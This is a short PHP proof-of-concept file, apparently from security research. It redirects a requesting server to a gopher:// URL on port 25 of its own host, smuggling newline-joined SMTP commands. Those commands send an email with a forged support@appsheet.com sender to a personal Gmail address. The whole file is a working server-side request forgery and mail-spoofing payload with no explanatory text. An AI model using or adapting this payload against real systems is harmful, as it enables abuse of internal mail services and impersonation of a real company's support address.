<?php3
        $commands = array(
                'HELO victim.com',
                'MAIL FROM: <support@appsheet.com>',
                'RCPT To: <missoumozil@gmail.com>',
                'DATA',
                'Subject: testign',
                'test',
                '.'
        );

        $payload = implode('%0A', $commands);

        header('Location: gopher://0:25/_'.$payload);
?>
